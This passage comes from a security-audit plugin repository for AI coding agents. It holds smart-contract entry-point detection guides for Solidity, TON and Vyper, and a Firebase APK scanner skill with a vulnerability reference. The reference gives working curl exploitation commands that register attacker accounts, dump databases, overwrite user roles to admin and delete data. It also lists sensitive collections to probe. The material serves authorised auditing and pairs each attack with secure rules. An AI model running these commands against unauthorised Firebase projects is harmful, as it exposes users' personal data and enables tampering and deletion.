algebraSwapCallback(...) external\n\n// Flash loan callbacks\nfunction onFlashLoan(...) external returns (bytes32)\nfunction executeOperation(...) external returns (bool)  // Aave\nfunction receiveFlashLoan(...) external                 // Balancer\n```\n\n### Contract-Caller Checks\n```solidity\nrequire(msg.sender == address(pool), \"...\");    // Specific contract\nrequire(msg.sender != tx.origin, \"...\");        // Must be contract\nrequire(tx.origin != msg.sender);               // No EOA calls\n```\n\n## Extraction Strategy\n\n1. Parse all `.sol` files\n2. For each contract/interface/abstract:\n   - Extract `external` and `public` functions\n   - **Skip** functions with `view` or `pure` modifiers\n   - Record function signature: `name(paramTypes)`\n   - Record line number\n   - Extract all modifiers applied\n3. Classify by modifiers:\n   - No access modifiers  Public (Unrestricted)\n   - Known role modifier  Appropriate role category\n   - Inline `require(msg.sender...)`  Review Required\n   - Callback pattern  Contract-Only\n\n## Inheritance Considerations\n\n- Check parent contracts for modifier definitions\n- A function may inherit access control from overridden function\n- Abstract contracts may define modifiers used by children\n- Interfaces define signatures but not access control\n\n## Common Gotchas\n\n1. **Initializers**: `initialize()` often has `initializer` modifier but may be unrestricted on first call\n2. **Proxies**: Implementation contracts may have different access patterns than proxies\n3. **Upgrades**: `upgradeTo()`, `upgradeToAndCall()` are high-privilege\n4. **Multicall**: `multicall(bytes[])` allows batchingcheck what it can call\n5. **Permit**: `permit()` functions enable gasless approvalscheck EIP-2612 compliance\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/ton.md": "# TON Entry Point Detection (FunC/Tact)\n\n## Entry Point Identification (State-Changing Only)\n\nFocus on message handlers that modify state. **Exclude** read-only patterns:\n- `get` methods in FunC (pure getters)\n- Receivers that only return data without state changes\n\n### FunC Entry Points\n```func\n;; Main entry point - receives all external messages\n() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {\n    ;; Dispatch based on op code\n    int op = in_msg_body~load_uint(32);\n    if (op == op::transfer) { handle_transfer(); }\n}\n\n;; External messages (from outside blockchain)\n() recv_external(slice in_msg) impure {\n    ;; Usually for wallet operations\n}\n\n;; Tick-tock for special contracts\n() run_ticktock(cell full_state, int is_tock) impure {\n}\n```\n\n### Tact Entry Points\n```tact\ncontract MyContract {\n    // Receivers are entry points\n    receive(msg: Transfer) {\n        // Handle Transfer message\n    }\n    \n    receive(\"increment\") {\n        // Handle text message\n    }\n    \n    // External receiver\n    external(msg: Deploy) {\n        // Handle external message\n    }\n    \n    // Bounce handler\n    bounced(src: bounced<Transfer>) {\n        // Handle bounced message\n    }\n}\n```\n\n### Entry Point Types\n| Pattern | Include? | Notes |\n|---------|----------|-------|\n| `recv_internal` | **Yes** | All internal messages (state-changing) |\n| `recv_external` | **Yes** | External (off-chain) messages |\n| `receive(MsgType)` | **Yes** | Tact message handler |\n| `external(MsgType)` | **Yes** | Tact external handler |\n| `bounced(...)` | **Yes** | Bounce handler |\n| `get` methods (FunC) | No | EXCLUDE - read-only getters |\n| `get fun` (Tact) | No | EXCLUDE - read-only getters |\n| Helper functions | No | Internal only |\n\n## Access Control Patterns\n\n### FunC Access Control\n```func\n;; Owner check\n() check_owner() impure inline {\n    throw_unless(401, equal_slices(sender_address, owner_address));\n}\n\n;; Admin check via stored address\n() require_admin() impure inline {\n    var ds = get_data().begin_parse();\n    slice admin = ds~load_msg_addr();\n    throw_unless(403, equal_slices(sender_address, admin));\n}\n```\n\n### Tact Access Control\n```tact\ncontract Owned {\n    owner: Address;\n    \n    receive(msg: AdminAction) {\n        require(sender() == self.owner, \"Not owner\");\n        // ...\n    }\n    \n    // Using traits\n    receive(msg: Transfer) {\n        self.requireOwner();  // From Ownable trait\n        // ...\n    }\n}\n```\n\n### Op Code Dispatch Pattern (FunC)\n```func\n() recv_internal(...) impure {\n    int op = in_msg_body~load_uint(32);\n    \n    ;; Public operations\n    if (op == op::transfer) { return handle_transfer(); }\n    if (op == op::swap) { return handle_swap(); }\n    \n    ;; Admin operations\n    if (op == op::set_fee) {\n        check_owner();\n        return handle_set_fee();\n    }\n}\n```\n\n### Access Control Classification\n| Pattern | Classification |\n|---------|----------------|\n| `equal_slices(sender, owner)` | Owner |\n| `equal_slices(sender, admin)` | Admin |\n| `require(sender() == self.owner)` | Owner |\n| `self.requireOwner()` | Owner |\n| `throw_unless(X, equal_slices(...))` | Check error code context |\n| No sender check for op code | Public (Unrestricted) |\n\n## Contract-Only Detection\n\n### Callback Patterns\n```func\n;; Jetton transfer notification\n() on_jetton_transfer(...) impure {\n    ;; Should verify sender is jetton wallet\n}\n\n;; NFT callbacks\n() on_nft_transfer(...) impure {\n}\n```\n\n### Contract Verification\n```func\n;; Verify caller is expected contract\n() verify_caller(slice expected) impure inline {\n    throw_unless(402, equal_slices(sender_address, expected));\n}\n```\n\n## Extraction Strategy\n\n### FunC\n1. Parse `.fc` / `.func` files\n2. Find `recv_internal` and `recv_external` functions\n3. Extract op code dispatch table:\n   - Map op codes to handler functions\n   - Check each handler for owner/admin checks\n4. Classify:\n   - Op codes with no access check  Public\n   - Op codes with `check_owner`/similar  Role-based\n   - Callbacks  Contract-Only\n\n### Tact\n1. Parse `.tact` files\n2. Find `contract` declarations\n3. Extract all `receive`, `external`, `bounced` handlers\n   - **Skip** `get fun` declarations (read-only getters)\n4. Check handler body for:\n   - `require(sender() == self.X)`  Role-based\n   - `self.requireOwner()`  Owner\n   - No sender validation  Public (Unrestricted)\n\n## TON-Specific Considerations\n\n1. **Message-Based**: All interactions are via messages with op codes\n2. **Workchains**: Check if contract operates on specific workchain\n3. **Bounced Messages**: Handle bounced messages appropriately\n4. **Gas Management**: `accept_message()` in FunC accepts gas payment\n5. **State Init**: Initial deployment may set owner/admin\n\n## Common Gotchas\n\n1. **Op Code Collisions**: Different contracts may use same op codes\n2. **Proxy Patterns**: Some contracts forward messages\n3. **Wallet Contracts**: Special access control for wallet operations\n4. **Masterchain**: Some operations require masterchain deployment\n5. **Query ID**: Track request/response with query_id\n",
        "plugins/entry-point-analyzer/skills/entry-point-analyzer/references/vyper.md": "# Vyper Entry Point Detection\n\n## Entry Point Identification (State-Changing Only)\n\n### Include: State-Changing Functions\n```vyper\n@external                    # State-changing entry point\ndef function_name():\n    pass\n\n@external\n@payable                     # State-changing, receives ETH\ndef payable_function():\n    pass\n\n@external\n@nonreentrant(\"lock\")        # State-changing with reentrancy protection\ndef protected():\n    pass\n```\n\n### Exclude: Read-Only Functions\n```vyper\n@external\n@view                        # EXCLUDE - cannot modify state\ndef read_only():\n    pass\n\n@external\n@pure                        # EXCLUDE - no state access\ndef pure_function():\n    pass\n```\n\n### Decorator Matrix\n| Decorators | Include? | Notes |\n|------------|----------|-------|\n| `@external` | **Yes** | State-changing entry point |\n| `@external @payable` | **Yes** | State-changing, receives ETH |\n| `@external @nonreentrant` | **Yes** | State-changing with protection |\n| `@external @view` | No | Read-only, exclude |\n| `@external @pure` | No | No state access, exclude |\n| `@internal` | No | Not externally callable |\n| `@deploy` | No | Constructor (Vyper 0.4+) |\n\n### Special Entry Points\n```vyper\n@external\n@payable\ndef __default__():           # Fallback function (receives ETH + unmatched calls)\n    pass\n```\n\n## Access Control Patterns\n\n### Owner Pattern\n```vyper\nowner: public(address)\n\n@external\ndef restricted_function():\n    assert msg.sender == self.owner, \"Not owner\"\n    # ...\n```\n\n### Role-Based Patterns\n```vyper\n# Common patterns\nadmin: public(address)\ngovernance: public(address)\nguardian: public(address)\noperator: public(address)\n\n# Mapping-based roles\nauthorized: public(HashMap[address, bool])\nminters: public(HashMap[address, bool])\n\n@external\ndef mint(to: address, amount: uint256):\n    assert self.minters[msg.sender], \"Not minter\"\n    # ...\n```\n\n### Access Control Classification\n| Pattern | Classification |\n|---------|----------------|\n| `assert msg.sender == self.owner` | Admin/Owner |\n| `assert msg.sender == self.admin` | Admin |\n| `assert msg.sender == self.governance` | Governance |\n| `assert msg.sender == self.guardian` | Guardian |\n| `assert self.authorized[msg.sender]` | Review Required |\n| `assert self.whitelist[msg.sender]` | Review Required |\n\n## Contract-Only Detection\n\n### Callback Functions\n```vyper\n@external\ndef onERC721Received(...) -> bytes4:\n    return method_id(\"onERC721Received(address,address,uint256,bytes)\")\n\n@external\ndef uniswapV3SwapCallback(amount0: int256, amount1: int256, data: Bytes[...]):\n    # Must verify caller is the pool\n    pass\n```\n\n### Contract-Caller Checks\n```vyper\nassert msg.sender == self.pool, \"Only pool\"\nassert msg.sender != tx.origin, \"No EOA\"  # Vyper 0.3.7+\n```\n\n## Extraction Strategy\n\n1. Parse all `.vy` files\n2. For each function:\n   - Check for `@external` decorator\n   - **Skip** functions with `@view` or `@pure` decorators\n   - Record function name and parameters\n   - Record line number\n   - Check for access control assertions in function body\n3. Classify:\n   - No access assertions  Public (Unrestricted)\n   - `msg.sender == self.X`  Check what X is\n   - `self.mapping[msg.sender]`  Review Required\n   - Known callback name  Contract-Only\n\n## Vyper-Specific Considerations\n\n1. **No Modifiers**: Vyper doesn't have modifiersaccess control is inline `assert` statements\n2. **No Inheritance**: Each contract is standalone (interfaces only)\n3. **Explicit is Better**: All visibility must be declared explicitly\n4. **Default Internal**: Functions without decorators are internal\n\n## Common Gotchas\n\n1. **Initializer Pattern**: Look for `initialized: bool` flag with one-time setup\n2. **Raw Calls**: `raw_call()` can delegate to other contracts\n3. **Create Functions**: `create_minimal_proxy_to()`, `create_copy_of()` are factory patterns\n4. **Reentrancy**: `@nonreentrant` protects against reentrancy but function is still entry point\n",
        "plugins/firebase-apk-scanner/.claude-plugin/plugin.json": "{\n  \"name\": \"firebase-apk-scanner\",\n  \"version\": \"2.1.0\",\n  \"description\": \"Scan Android APKs for Firebase security misconfigurations including open databases, storage buckets, authentication issues, and exposed cloud functions. For authorized security research only.\",\n  \"author\": {\n    \"name\": \"Nick Sellier\",\n    \"email\": \"\",\n    \"url\": \"\"\n  }\n}\n",
        "plugins/firebase-apk-scanner/README.md": "# Firebase APK Security Scanner\n\nScan Android APKs for Firebase security misconfigurations including open databases, exposed storage buckets, and authentication bypasses.\n\n## When to Use\n\nUse this skill when you need to:\n- Audit Android applications for Firebase misconfigurations\n- Test Firebase endpoints extracted from APKs (Realtime Database, Firestore, Storage)\n- Check authentication security (open signup, anonymous auth, email enumeration)\n- Enumerate Cloud Functions and test for unauthenticated access\n- Perform mobile app security assessments involving Firebase backends\n\n## When NOT to Use\n\n- Scanning apps you do not have explicit authorization to test\n- Testing production Firebase projects without written permission\n- When you only need to extract Firebase config without testing (use manual grep/strings instead)\n- For non-Android targets (iOS, web apps) - this skill is APK-specific\n- When the target app does not use Firebase\n\n## What It Does\n\nThis skill automates Firebase security testing for Android applications. When invoked, Claude will:\n\n- **Decompile** the APK using apktool\n- **Extract** Firebase configuration from all sources (google-services.json, XML resources, assets, smali code, DEX strings)\n- **Test** authentication endpoints for misconfigurations\n- **Probe** Realtime Database and Firestore for open read/write access\n- **Check** Storage buckets for public listing and upload vulnerabilities\n- **Enumerate** Cloud Functions and test accessibility\n- **Generate** detailed reports with findings and remediation guidance\n\n## Key Features\n\n- Supports native Android, React Native, Flutter, and Cordova apps\n- Extracts config from 7+ sources including raw DEX binary strings\n- Tests 14 distinct vulnerability categories\n- Automatic cleanup of test data created during scans\n- Detailed vulnerability reference documentation included\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/firebase-apk-scanner\n```\n\n## Prerequisites\n\nInstall required dependencies before use:\n\n**macOS:**\n```bash\nbrew install apktool curl jq binutils\n```\n\n**Ubuntu/Debian:**\n```bash\nsudo apt install apktool curl jq unzip binutils\n```\n\n## Usage\n\n```\n/firebase-scan ./app.apk\n/firebase-scan ./apks/\n```\n\nOr run the standalone script directly:\n\n```bash\n./scanner.sh app.apk\n./scanner.sh ./apks/ --no-cleanup\n```\n\n## Vulnerability Categories\n\n| Category | Tests | Severity |\n|----------|-------|----------|\n| **Authentication** | Open signup, anonymous auth, email enumeration | Critical/High/Medium |\n| **Realtime Database** | Unauthenticated read/write, auth token bypass | Critical/High |\n| **Firestore** | Document access, collection enumeration | Critical/High |\n| **Storage** | Bucket listing, unauthenticated upload | Critical/High |\n| **Cloud Functions** | Unauthenticated access, function enumeration | Medium/Low |\n| **Remote Config** | Public parameter exposure | Medium |\n",
        "plugins/firebase-apk-scanner/commands/scan-apk.md": "---\nname: trailofbits:scan-apk\ndescription: Scans Android APKs for Firebase security misconfigurations\nargument-hint: \"<apk-file-or-directory>\"\nallowed-tools:\n  - Bash\n  - Read\n  - Grep\n  - Glob\n---\n\n# Scan APK for Firebase Misconfigurations\n\n**Arguments:** $ARGUMENTS\n\nParse the APK path from arguments. If empty, ask for the path.\n\nInvoke the `firebase-apk-scanner` skill with the APK path for the full workflow.\n",
        "plugins/firebase-apk-scanner/skills/firebase-apk-scanner/SKILL.md": "---\nname: firebase-apk-scanner\ndescription: Scans Android APKs for Firebase security misconfigurations including open databases, storage buckets, authentication issues, and exposed cloud functions. Use when analyzing APK files for Firebase vulnerabilities, performing mobile app security audits, or testing Firebase endpoint security. For authorized security research only.\nargument-hint: [apk-file-or-directory]\nallowed-tools: Bash({baseDir}/scanner.sh:*), Bash(apktool:*), Bash(curl:*), Read, Grep, Glob\ndisable-model-invocation: true\n---\n\n# Firebase APK Security Scanner\n\nYou are a Firebase security analyst. When this skill is invoked, scan the provided APK(s) for Firebase misconfigurations and report findings.\n\n## When to Use\n\n- Auditing Android applications for Firebase security misconfigurations\n- Testing Firebase endpoints extracted from APKs (Realtime Database, Firestore, Storage)\n- Checking authentication security (open signup, anonymous auth, email enumeration)\n- Enumerating Cloud Functions and testing for unauthenticated access\n- Mobile app security assessments involving Firebase backends\n- Authorized penetration testing of Firebase-backed applications\n\n## When NOT to Use\n\n- Scanning apps you do not have explicit authorization to test\n- Testing production Firebase projects without written permission\n- When you only need to extract Firebase config without testing (use manual grep/strings instead)\n- For non-Android targets (iOS, web apps) - this skill is APK-specific\n- When the target app does not use Firebase\n\n## Rationalizations to Reject\n\nWhen auditing, reject these common rationalizations that lead to missed or downplayed findings:\n\n- **\"The database is read-only so it's fine\"** - Data exposure is still a critical finding; PII, API keys, and business data may be leaked\n- **\"It's just anonymous auth, not real accounts\"** - Anonymous tokens bypass `auth != null` rules and can access \"authenticated-only\" resources\n- **\"The API key is public anyway\"** - A public API key does not justify open database rules or disabled auth restrictions\n- **\"There's no sensitive data in there\"** - You cannot know what data will be stored in the future; insecure rules are vulnerabilities regardless of current content\n- **\"It's an internal app\"** - APKs can be extracted from any device; \"internal\" apps are not protected from reverse engineering\n- **\"We'll fix it before launch\"** - Document the finding; pre-launch vulnerabilities frequently ship to production\n\n## Reference Documentation\n\nFor detailed vulnerability patterns and exploitation techniques, consult:\n- [Vulnerability Patterns Reference](references/vulnerabilities.md)\n\n## How to Use This Skill\n\nThe user will provide an APK file or directory: `$ARGUMENTS`\n\n## Workflow\n\n### Step 1: Validate Input\n\nFirst, verify the target exists:\n\n```bash\nls -la $ARGUMENTS\n```\n\nIf `$ARGUMENTS` is empty, ask the user to provide an APK path.\n\n### Step 2: Run the Scanner\n\nExecute the bundled scanner script on the target:\n\n```bash\n{baseDir}/scanner.sh $ARGUMENTS\n```\n\nThe scanner will:\n1. Decompile the APK using apktool\n2. Extract Firebase configuration from all sources (google-services.json, XML resources, assets, smali code, DEX strings)\n3. Test authentication endpoints (open signup, anonymous auth, email enumeration)\n4. Test Realtime Database (unauthenticated read/write, auth bypass)\n5. Test Firestore (document access, collection enumeration)\n6. Test Storage buckets (listing, write access)\n7. Test Cloud Functions (enumeration, unauthenticated access)\n8. Test Remote Config exposure\n9. Generate reports in text and JSON format\n\n### Step 3: Present Results\n\nAfter the scanner completes, read and summarize the results:\n\n```bash\ncat firebase_scan_*/scan_report.txt\n```\n\nPresent findings in this format:\n\n---\n\n## Scan Summary\n\n| Metric | Value |\n|--------|-------|\n| APKs Scanned | X |\n| Vulnerable | X |\n| Total Issues | X |\n\n## Extracted Configuration\n\n| Field | Value |\n|-------|-------|\n| Project ID | `extracted_value` |\n| Database URL | `extracted_value` |\n| Storage Bucket | `extracted_value` |\n| API Key | `extracted_value` |\n| Auth Domain | `extracted_value` |\n\n## Vulnerabilities Found\n\n| Severity | Issue | Evidence |\n|----------|-------|----------|\n| CRITICAL | Description | Brief evidence |\n| HIGH | Description | Brief evidence |\n\n## Remediation\n\nProvide specific fixes for each vulnerability found. Reference the [Vulnerability Patterns](references/vulnerabilities.md) for secure code examples.\n\n---\n\n## Manual Testing (If Scanner Fails)\n\nIf the scanner script is unavailable or fails, perform manual extraction and testing:\n\n### Extract Configuration\n\nSearch for Firebase config in decompiled APK:\n\n```bash\n# Decompile\napktool d -f -o ./decompiled $ARGUMENTS\n\n# Find google-services.json\nfind ./decompiled -name \"google-services.json\"\n\n# Search XML resources\ngrep -r \"firebaseio.com\\|appspot.com\\|AIza\" ./decompiled/res/\n\n# Search assets (hybrid apps)\ngrep -r \"firebaseio.com\\|AIza\" ./decompiled/assets/\n```\n\n### Test Endpoints\n\nOnce you have the PROJECT_ID and API_KEY:\n\n**Authentication:**\n```bash\n# Test open signup\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"test@test.com\",\"password\":\"Test123!\",\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY\"\n\n# Test anonymous auth\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY\"\n```\n\n**Database:**\n```bash\n# Realtime Database read\ncurl -s \"https://PROJECT_ID.firebaseio.com/.json\"\n\n# Firestore read\ncurl -s \"https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents\"\n```\n\n**Storage:**\n```bash\n# List bucket\ncurl -s \"https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o\"\n```\n\n**Remote Config:**\n```bash\ncurl -s -H \"x-goog-api-key: API_KEY\" \\\n  \"https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT_ID/remoteConfig\"\n```\n\n## Severity Classification\n\n- **CRITICAL**: Unauthenticated database read/write, storage write, open signup on private apps\n- **HIGH**: Anonymous auth enabled, storage bucket listing, collection enumeration\n- **MEDIUM**: Email enumeration, accessible cloud functions, remote config exposure\n- **LOW**: Information disclosure without sensitive data\n\n## Important Guidelines\n\n1. **Authorization required** - Only scan APKs you have permission to test\n2. **Clean up test data** - The scanner automatically removes test entries it creates\n3. **Save tokens** - If anonymous auth succeeds, use the token for authenticated bypass testing\n4. **Test all regions** - Cloud Functions may be deployed to us-central1, europe-west1, asia-east1, etc.\n5. **Multiple instances** - Some apps use multiple Firebase projects; test all discovered configurations\n",
        "plugins/firebase-apk-scanner/skills/firebase-apk-scanner/references/vulnerabilities.md": "# Firebase Security Vulnerability Patterns\n\nDetailed vulnerability patterns, exploitation techniques, and audit checklists for Firebase implementations in mobile applications.\n\n---\n\n## 1. OPEN EMAIL/PASSWORD SIGNUP (Critical)\n\n**The Problem:** Firebase Authentication allows anyone to create accounts via the Identity Toolkit API, even if the app UI doesn't expose registration.\n\n**Vulnerable Configuration:**\n```\nFirebase Console  Authentication  Sign-in method  Email/Password: Enabled\n```\n\n**Exploitation:**\n```bash\n# Create arbitrary account via API\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"attacker@evil.com\",\"password\":\"Password123!\",\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n```\n\n**Successful Attack Response:**\n```json\n{\n  \"idToken\": \"eyJhbGciOiJSUzI1NiIs...\",\n  \"email\": \"attacker@evil.com\",\n  \"refreshToken\": \"AGEhc0C...\",\n  \"expiresIn\": \"3600\",\n  \"localId\": \"abc123xyz\"\n}\n```\n\n**Impact:**\n- Bypass invite-only systems\n- Access authenticated-only resources\n- Exhaust authentication quotas\n- Potential for account enumeration attacks\n\n**Secure Configuration:**\n```\nFirebase Console  Authentication  Settings  User Actions:\n   Enable create (sign-up)   DISABLE THIS\n   Enable delete\n\nOr use Admin SDK for user creation only:\n```\n```javascript\n// Server-side only user creation\nconst admin = require('firebase-admin');\nadmin.auth().createUser({\n  email: 'user@example.com',\n  password: 'securePassword123'\n});\n```\n\n**Audit Checklist:**\n- [ ] Test `accounts:signUp` endpoint with API key\n- [ ] Check if `ADMIN_ONLY_OPERATION` error is returned\n- [ ] Verify user creation is restricted to admin SDK\n- [ ] Review if app legitimately needs public signup\n\n---\n\n## 2. ANONYMOUS AUTHENTICATION ENABLED (High)\n\n**The Problem:** Anonymous auth creates real Firebase users with valid tokens, bypassing `auth != null` security rules.\n\n**Vulnerable Configuration:**\n```\nFirebase Console  Authentication  Sign-in method  Anonymous: Enabled\n```\n\n**Exploitation:**\n```bash\n# Get anonymous auth token\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"returnSecureToken\":true}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaXXXXXX\"\n```\n\n**Successful Attack Response:**\n```json\n{\n  \"idToken\": \"eyJhbGciOiJSUzI1NiIs...\",\n  \"refreshToken\": \"AGEhc0B...\",\n  \"expiresIn\": \"3600\",\n  \"localId\": \"anon_user_id_123\"\n}\n```\n\n**Bypassing \"Authenticated Only\" Rules:**\n```javascript\n// These rules are BYPASSED by anonymous auth\n{\n  \"rules\": {\n    \".read\": \"auth != null\",  // Anonymous user passes this!\n    \".write\": \"auth != null\"\n  }\n}\n```\n\n**Attack with Token:**\n```bash\n# Access \"authenticated\" resources with anonymous token\ncurl \"https://PROJECT.firebaseio.com/users.json?auth=eyJhbGciOiJSUzI1NiIs...\"\n```\n\n**Secure Rules (Require Real Users):**\n```javascript\n{\n  \"rules\": {\n    \".read\": \"auth != null && auth.token.email_verified == true\",\n    \".write\": \"auth != null && auth.provider !== 'anonymous'\"\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test anonymous signup endpoint\n- [ ] If token returned, test database/storage access with it\n- [ ] Check if security rules distinguish anonymous vs real users\n- [ ] Verify business need for anonymous authentication\n\n---\n\n## 3. EMAIL ENUMERATION (Medium)\n\n**The Problem:** The `createAuthUri` endpoint reveals whether an email is registered.\n\n**Vulnerable Response:**\n```bash\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"identifier\":\"victim@company.com\",\"continueUri\":\"https://localhost\"}' \\\n  \"https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=AIzaXXXXXX\"\n```\n\n**Information Disclosure Response:**\n```json\n{\n  \"kind\": \"identitytoolkit#CreateAuthUriResponse\",\n  \"registered\": true,  // LEAKS registration status\n  \"sessionId\": \"...\",\n  \"signinMethods\": [\"password\"]  // LEAKS auth methods\n}\n```\n\n**Impact:**\n- User enumeration for targeted attacks\n- Credential stuffing reconnaissance\n- Social engineering intelligence\n\n**Secure Configuration:**\n```\nFirebase Console  Authentication  Settings  User enumeration protection: Enabled\n```\n\n**Audit Checklist:**\n- [ ] Test `createAuthUri` with known and unknown emails\n- [ ] Check if `registered` field varies between existing/non-existing users\n- [ ] Verify email enumeration protection is enabled\n\n---\n\n## 4. REALTIME DATABASE UNAUTHENTICATED READ (Critical)\n\n**The Problem:** Database rules allow public read access to all data.\n\n**Vulnerable Rules:**\n```json\n{\n  \"rules\": {\n    \".read\": true,\n    \".write\": false\n  }\n}\n```\n\n**Exploitation:**\n```bash\n# Read entire database\ncurl \"https://PROJECT-ID.firebaseio.com/.json\"\n\n# Read with shallow query (shows structure even if full read denied)\ncurl \"https://PROJECT-ID.firebaseio.com/.json?shallow=true\"\n\n# Read specific paths\ncurl \"https://PROJECT-ID.firebaseio.com/users.json\"\ncurl \"https://PROJECT-ID.firebaseio.com/messages.json\"\ncurl \"https://PROJECT-ID.firebaseio.com/orders.json\"\n```\n\n**Data Exposure Response:**\n```json\n{\n  \"users\": {\n    \"user123\": {\n      \"email\": \"john@example.com\",\n      \"phone\": \"+1234567890\",\n      \"address\": \"123 Main St\"\n    }\n  },\n  \"api_keys\": {\n    \"stripe\": \"sk_live_XXXX\",\n    \"twilio\": \"ACXXXX\"\n  }\n}\n```\n\n**Secure Rules:**\n```json\n{\n  \"rules\": {\n    \".read\": false,\n    \".write\": false,\n    \"users\": {\n      \"$uid\": {\n        \".read\": \"$uid === auth.uid\",\n        \".write\": \"$uid === auth.uid\"\n      }\n    },\n    \"public\": {\n      \".read\": true,\n      \".write\": false\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test root read: `/.json`\n- [ ] Test shallow query: `/.json?shallow=true`\n- [ ] Enumerate common paths: users, messages, orders, config, admin\n- [ ] Check for sensitive data exposure (PII, API keys, tokens)\n\n---\n\n## 5. REALTIME DATABASE UNAUTHENTICATED WRITE (Critical)\n\n**The Problem:** Database rules allow public write access, enabling data manipulation or injection.\n\n**Vulnerable Rules:**\n```json\n{\n  \"rules\": {\n    \".read\": false,\n    \".write\": true  // CRITICAL VULNERABILITY\n  }\n}\n```\n\n**Exploitation:**\n```bash\n# Write arbitrary data\ncurl -X PUT \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"attacker\":\"was_here\",\"timestamp\":1234567890}' \\\n  \"https://PROJECT-ID.firebaseio.com/pwned.json\"\n\n# Overwrite existing data\ncurl -X PUT \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"role\":\"admin\"}' \\\n  \"https://PROJECT-ID.firebaseio.com/users/victim_uid/profile.json\"\n\n# Delete data\ncurl -X DELETE \"https://PROJECT-ID.firebaseio.com/important_data.json\"\n```\n\n**Impact:**\n- Data tampering and corruption\n- Privilege escalation (modify user roles)\n- Inject malicious content\n- Delete critical data\n- Store illegal content\n\n**Secure Rules:**\n```json\n{\n  \"rules\": {\n    \".write\": false,\n    \"user_content\": {\n      \"$uid\": {\n        \".write\": \"$uid === auth.uid\",\n        \".validate\": \"newData.hasChildren(['title', 'body']) && newData.child('title').isString()\"\n      }\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test write to test path: `/_security_test.json`\n- [ ] Attempt to modify existing data paths\n- [ ] Check if validation rules exist\n- [ ] Clean up any test data written\n\n---\n\n## 6. FIRESTORE OPEN DOCUMENT ACCESS (Critical)\n\n**The Problem:** Firestore security rules allow public access to collections.\n\n**Vulnerable Rules:**\n```javascript\nrules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;  // OPEN TO EVERYONE\n    }\n  }\n}\n```\n\n**Exploitation:**\n```bash\n# List root collections\ncurl \"https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents\"\n\n# Read specific collection\ncurl \"https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users\"\n\n# Read specific document\ncurl \"https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users/admin\"\n```\n\n**Write Attack:**\n```bash\n# Create document\ncurl -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"fields\":{\"role\":{\"stringValue\":\"admin\"},\"injected\":{\"booleanValue\":true}}}' \\\n  \"https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users\"\n```\n\n**Common Sensitive Collections to Test:**\n```\nusers, accounts, profiles, members, customers, clients,\norders, transactions, payments, invoices, billing,\nmessages, chats, conversations, notifications,\nsettings, config, admin, secrets, tokens, api_keys,\nsessions, credentials, passwords, logs, audit\n```\n\n**Secure Rules:**\n```javascript\nrules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    // Deny all by default\n    match /{document=**} {\n      allow read, write: if false;\n    }\n\n    // User-specific access\n    match /users/{userId} {\n      allow read, write: if request.auth != null && request.auth.uid == userId;\n    }\n\n    // Public read, authenticated write\n    match /public/{docId} {\n      allow read: if true;\n      allow write: if request.auth != null;\n    }\n  }\n}\n```\n\n**Audit Checklist:**\n- [ ] Test root document listing\n- [ ] Enumerate common collection names\n- [ ] Test write access to collections\n- [ ] Check for PII and sensitive data exposure\n- [ ] Verify rules use `request.auth.uid` for user data\n\n---\n\n## 7. FIREBASE STORAGE BUCKET LISTING (High)\n\n**The Problem:** Storage rules allow listing bucket contents, exposing all stored files.\n\n**Vulnerable Rules:**\n```javascript\nrules_version = '2';\nservice firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}\n```\n\n**Exploitation:**\n```bash\n# List all files in bucket\ncurl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o\"\n\n# Alternative: gs:// format bucket\ncurl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID/o\"\n```\n\n**Exposed Files Response:**\n```json\n{\n  \"items\": [\n    {\n      \"name\": \"user_uploads/private_document.pdf\",\n      \"bucket\": \"project-id.appspot.com\",\n      \"contentType\": \"application/pdf\",\n      \"size\": \"1048576\",\n      \"downloadTokens\": \"abc123\"\n    },\n    {\n      \"name\": \"backups/database_dump_2024.sql\",\n      \"bucket\": \"project-id.appspot.com\"\n    }\n  ]\n}\n```\n\n**Download Exposed Files:**\n```bash\n# Download using the file path\ncurl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/user_uploads%2Fprivate_document.pdf?alt=media\"\n```\n\n**Impact:**\n- Exposure of user-uploaded content\n- Access to backup files\n- Private documents, images, videos leaked\n- Potential credential/key exposure in uploaded files\n\n**Secure Rules:**\n```javascript\nrules_version = '2';\nservice firebase.storage {\n  match /b/{bucket}/o {\n    // Deny listing by default\n    match 